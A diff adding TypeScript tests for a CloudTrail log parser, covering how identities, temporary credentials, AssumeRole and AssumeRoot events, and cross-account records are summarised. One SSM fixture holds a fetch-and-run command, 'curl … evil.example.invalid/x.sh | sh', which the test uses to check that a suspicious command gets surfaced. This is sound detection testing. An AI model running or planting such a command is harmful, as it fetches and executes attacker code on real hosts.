@@ -462,7 +462,7 @@ describe("parseCloudTrail — IAM changes (#931 item 6)", () => {
     const by = (role: string) => r.events.find((e) => e.description.includes(`role=${role}`))!;
     expect(by("a").severity).toBe("Medium");
     expect(by("a").description).toMatch(
-      /^AWS DeleteRolePermissionsBoundary \(iam\) by bob from 203\.0\.113\.10 in us-east-1 attempted to remove permissions boundary — denied \(AccessDenied\)/,
+      /^AWS DeleteRolePermissionsBoundary \(iam\) by bob from 203\.0\.113\.10 in us-east-1 IAMUser \(long-term\)[^—]*attempted to remove permissions boundary — denied \(AccessDenied\)/,
     );
     expect(by("b").severity).toBe("High");
     expect(by("b").description).toContain("removes permissions boundary role=b — may increase permissions");
@@ -571,5 +571,242 @@ describe("parseCloudTrail — IAM changes (#931 item 6)", () => {
     );
     expect(r.events[0].severity).toBe("Medium");
     expect(r.events[0].description).toContain("creates user user=new userId=AIDAEXAMPLE");
+  });
+});
+
+describe("parseCloudTrail — identities and credentials (#931 item 5)", () => {
+  const ACCT = "111122223333";
+  const OTHER = "444455556666";
+  const ROLE_ARN = `arn:aws:iam::${ACCT}:role/admin-role`;
+  const assumedRole = (over: object = {}) => ({
+    type: "AssumedRole",
+    principalId: "AROAEXAMPLEID:i-0abc123",
+    arn: `arn:aws:sts::${ACCT}:assumed-role/admin-role/i-0abc123`,
+    accountId: ACCT,
+    accessKeyId: "ASIAEXAMPLEKEY000001",
+    sessionContext: {
+      sessionIssuer: {
+        type: "Role",
+        principalId: "AROAEXAMPLEID",
+        arn: ROLE_ARN,
+        accountId: ACCT,
+        userName: "admin-role",
+      },
+      attributes: { creationDate: "2024-05-01T09:00:00Z", mfaAuthenticated: "false" },
+    },
+    ...over,
+  });
+  it("a plain row carries the caller's identity words after the head, and the typed credential, issuer and accounts in the envelope", () => {
+    const r = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "DescribeInstances",
+          eventSource: "ec2.amazonaws.com",
+          readOnly: true,
+          userIdentity: assumedRole(),
+          recipientAccountId: ACCT,
+          eventID: "evt-1",
+        }),
+      ),
+    );
+    const e = r.events[0];
+    // The identity slot is 150 characters at most: the issuer ARN, last by design, is what clips.
+    expect(e.description).toMatch(
+      /^AWS DescribeInstances \(ec2\) by admin-role from 203\.0\.113\.10 in us-east-1 AssumedRole key ASIAEXAMPLEKEY000001 \(temporary\) session i-0abc123 since 2024-05-01T09:00:00Z CloudTrail mfaAuthenticated=false issuer Role arn:aws:i… \[ua: aws-cli\/2\.0\]$/,
+    );
+    expect(e.canonical?.authentication).toMatchObject({
+      credentialId: "ASIAEXAMPLEKEY000001",
+      issuer: ROLE_ARN,
+      mechanism: "AssumedRole",
+    });
+    expect(e.canonical?.cloud).toMatchObject({
+      principalType: "AssumedRole",
+      accountId: ACCT,
+      recipientAccountId: ACCT,
+    });
+  });
+  it("an AssumeRole row is findable by the key it issued: object the role, target the credential", () => {
+    const r = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "AssumeRole",
+          eventSource: "sts.amazonaws.com",
+          readOnly: true,
+          requestParameters: { roleArn: ROLE_ARN, roleSessionName: "deploy" },
+          responseElements: {
+            assumedRoleUser: {
+              arn: `arn:aws:sts::${ACCT}:assumed-role/admin-role/deploy`,
+              assumedRoleId: "AROAEXAMPLEID:deploy",
+            },
+            credentials: { accessKeyId: "ASIAEXAMPLEISSUED001", expiration: "May 1, 2024, 10:00:00 AM" },
+          },
+          recipientAccountId: ACCT,
+        }),
+      ),
+    );
+    const e = r.events[0];
+    expect(e.description).toContain(
+      `issues temporary credentials role ${ROLE_ARN} session deploy → key ASIAEXAMPLEISSUED001 expires May 1, 2024, 10:00:00 AM`,
+    );
+    expect(e.canonical?.object).toMatchObject({ kind: "cloud_principal", id: ROLE_ARN });
+    expect(e.canonical?.target).toMatchObject({
+      kind: "other",
+      id: "ASIAEXAMPLEISSUED001",
+      name: "temporary credential",
+    });
+    expect(e.severity).toBe("Info");
+  });
+  it("AssumeRoot is High on success and Medium when denied", () => {
+    const root = (over: object) =>
+      record({
+        eventName: "AssumeRoot",
+        eventSource: "sts.amazonaws.com",
+        readOnly: false,
+        requestParameters: {
+          targetPrincipal: OTHER,
+          taskPolicyArn: { arn: "arn:aws:iam::aws:policy/root-task/IAMAuditRootUserCredentials" },
+        },
+        ...over,
+      });
+    const r = parseCloudTrail(
+      envelope(
+        root({ responseElements: { credentials: { accessKeyId: "ASIAEXAMPLEROOT00001", expiration: "x" } } }),
+        root({ errorCode: "AccessDenied", eventID: "e2" }),
+      ),
+    );
+    const by = (s: string) => r.events.find((e) => e.description.includes(s))!;
+    expect(by("issues ROOT session credentials").severity).toBe("High");
+    expect(by("attempted to issue ROOT session credentials").severity).toBe("Medium");
+  });
+  it("the two records of one cross-account action are one row with two pointers, the named principal kept", () => {
+    const shared = "shared-evt-1";
+    const r = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "GetObject",
+          eventSource: "s3.amazonaws.com",
+          readOnly: true,
+          userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
+          recipientAccountId: OTHER,
+          eventID: "e-owner",
+          sharedEventID: shared,
+          requestParameters: { bucketName: "b", key: "k" },
+        }),
+        record({
+          eventName: "GetObject",
+          eventSource: "s3.amazonaws.com",
+          readOnly: true,
+          userIdentity: assumedRole(),
+          recipientAccountId: ACCT,
+          eventID: "e-caller",
+          sharedEventID: shared,
+          requestParameters: { bucketName: "b", key: "k" },
+        }),
+      ),
+    );
+    expect(r.events).toHaveLength(1);
+    const e = r.events[0];
+    expect(e.count ?? 1).toBe(1);
+    expect(e.description).toContain("AssumedRole key ASIAEXAMPLEKEY000001");
+    expect(e.description).toContain(`[also recorded in account ${OTHER}]`);
+    expect(e.canonical?.evidence.rawRecords.map((p) => p.recordId)).toEqual(["e-caller", "e-owner"]);
+  });
+  it("a reused session name under two access keys is two rows", () => {
+    const r = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "ListBuckets",
+          eventSource: "s3.amazonaws.com",
+          readOnly: true,
+          userIdentity: assumedRole({ accessKeyId: "ASIAEXAMPLEKEY000001" }),
+          eventID: "e1",
+        }),
+        record({
+          eventName: "ListBuckets",
+          eventSource: "s3.amazonaws.com",
+          readOnly: true,
+          userIdentity: assumedRole({ accessKeyId: "ASIAEXAMPLEKEY000002" }),
+          eventID: "e2",
+        }),
+      ),
+    );
+    expect(r.events).toHaveLength(2);
+  });
+  it("the identity yields to the evidence: a maximal IAM row and a maximal SSM row keep their mandatory slots", () => {
+    const longIdentity = assumedRole({
+      principalId: `AROAEXAMPLEID:${"s".repeat(300)}`,
+      sessionContext: {
+        sessionIssuer: {
+          type: "Role",
+          principalId: "AROAEXAMPLEID",
+          arn: `arn:aws:iam::${ACCT}:role/${"r".repeat(300)}`,
+          accountId: ACCT,
+          userName: "x",
+        },
+        attributes: { creationDate: "2024-05-01T09:00:00Z", mfaAuthenticated: "false" },
+        sourceIdentity: "i".repeat(200),
+      },
+    });
+    const iam = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "PutRolePolicy",
+          eventSource: "iam.amazonaws.com",
+          readOnly: false,
+          userIdentity: longIdentity,
+          recipientAccountId: ACCT,
+          errorCode: "AccessDenied",
+          requestParameters: {
+            roleName: "r".repeat(300),
+            policyName: "n".repeat(300),
+            policyDocument: JSON.stringify({
+              Version: "2012-10-17",
+              Statement: [
+                {
+                  Effect: "Allow",
+                  Action: "*",
+                  Resource: "*",
+                  Condition: { Bool: { "aws:MultiFactorAuthPresent": "true" } },
+                },
+              ],
+            }),
+          },
+        }),
+      ),
+    ).events[0].description;
+    expect(iam.length).toBeLessThanOrEqual(600);
+    expect(iam).toContain("attempted to replace inline policy — denied (AccessDenied)");
+    expect(iam).toContain("role=rrrr");
+    expect(iam).toContain("previous document not in this record");
+    expect(iam).toContain("effective access depends on controls not in this record");
+    expect(iam).toMatch(/AssumedRole key ASIAEXAMPLEKEY000001/);
+    const ssm = parseCloudTrail(
+      envelope(
+        record({
+          eventName: "SendCommand",
+          eventSource: "ssm.amazonaws.com",
+          readOnly: false,
+          userIdentity: longIdentity,
+          eventID: "evt-ssm",
+          requestParameters: {
+            documentName: "AWS-RunShellScript",
+            instanceIds: ["i-0abc123def456789a"],
+            parameters: { commands: ["curl http://evil.example.invalid/x.sh | sh"] },
+          },
+          responseElements: {
+            command: {
+              commandId: "cmd-1111",
+              documentName: "AWS-RunShellScript",
+              documentVersion: "3",
+              status: "Pending",
+            },
+          },
+        }),
+      ),
+    ).events[0].description;
+    expect(ssm.length).toBeLessThanOrEqual(600);
+    expect(ssm).toContain("[AWS-RunShellScript@3] cmd-1111 Pending: requested → i-0abc123def456789a");
+    expect(ssm).toContain('cmd: "curl http://evil.example.invalid/x.sh | sh"');
+    expect(ssm).toMatch(/AssumedRole key ASIAEXAMPLEKEY000001/);
   });
 });
